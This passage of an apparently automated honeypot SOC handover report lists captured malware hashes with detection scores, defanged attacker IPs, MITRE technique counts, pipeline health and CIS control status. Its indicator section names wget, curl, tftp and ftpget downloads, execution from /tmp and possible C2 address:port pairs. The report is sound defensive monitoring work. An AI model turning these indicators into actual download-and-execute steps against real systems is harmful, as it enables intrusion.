| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `153.37.177[.]219` | CN | China Unicom Jiangsu province network | **100** ⚠️ | 50 |
| `45.4.179[.]4` | BR | YUHOO NET | **100** ⚠️ | 19 |
| `50.188.204[.]213` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `197.155.225[.]93` | ZW | LIQUID Zimbabwe MPLS Core | **100** ⚠️ | 50 |
| `61.12.86[.]90` | IN | TTSL-ISP DIVISION | **100** ⚠️ | 50 |
| `121.178.185[.]141` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `45.178.227[.]0` | BR | GIGA REDE INTERNET LTDA | **100** ⚠️ | 50 |
| `213.230.64[.]246` | UZ | Uzbektelekom Joint Stock Company | **100** ⚠️ | 50 |
| `121.229.25[.]10` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `103.189.234[.]96` | SG | Cloud Host Pte Ltd | **100** ⚠️ | 36 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 245 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 227 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 81 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 80 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 79 |

---

## 🔕 False Positive Summary (35 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| AbuseIPDB score 6 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 29 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 442 cases |
| Tool 34  | Credential Extractor        | ✅ 275 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 20 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 166 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 35 filtered (7.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 85 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 33 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 226 priority case(s) shown individually · 50 recon entry/entries in table (22 group(s) consolidating 153 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-17T10:03:11Z_
